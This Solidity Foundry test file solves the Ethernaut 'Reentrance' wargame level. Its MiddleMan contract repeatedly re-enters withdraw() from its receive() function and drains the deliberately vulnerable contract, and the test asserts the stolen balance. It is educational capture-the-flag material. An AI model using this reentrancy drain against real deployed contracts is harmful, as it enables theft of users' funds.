// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Reentrance.sol";

// implement withdraw() in receive() or fallback(),
// s.t. calling withdraw() can trigger reentrancy
contract MiddleMan {
    Reentrance public reentrance;
    uint8 counter;

    constructor(address payable prey) payable {
        reentrance = Reentrance(prey);
    }

    function attack() public {
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);
    }

    receive() external payable {
        reentrance.withdraw(0.001 ether);
    }
}

// when the function call runs out of ether, it fails and thus won't call withdraw() again on the attacker's receive()
contract ReentranceTest is Test {
    Reentrance reentrance;
    address alice = makeAddr("alice");

    function setUp() public {
        vm.deal(alice, 1 ether);
        reentrance = new Reentrance();
        vm.deal(address(reentrance), 0.003 ether);
    }

    function test() public {
        MiddleMan middleMan = new MiddleMan{value: 0.001 ether}(payable(address(reentrance)));
        middleMan.attack();

        assertEq(address(reentrance).balance, 0 ether);
        assertEq(address(middleMan).balance, 0.004 ether);
    }
}
